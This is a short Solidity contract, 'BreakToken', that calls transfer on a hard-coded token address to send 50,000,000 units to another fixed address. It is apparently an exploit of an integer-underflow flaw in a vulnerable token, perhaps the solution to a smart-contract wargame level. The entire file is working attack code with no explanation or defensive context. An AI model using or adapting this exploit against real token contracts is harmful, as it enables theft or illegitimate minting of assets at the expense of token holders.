pragma solidity ^0.8.0;

interface Token {
  function transfer(address _to, uint256 _value) external returns (bool);
}

contract BreakToken {
  uint256 MAX = 50000000;

  Token public t = Token(0xa6371231494E58EDc98E9e99cB24242012efC592);

  function takeAlot() public {
    t.transfer(0xba5c9233d6e44586E849F69F819997399Df704F0, MAX);
  }
}
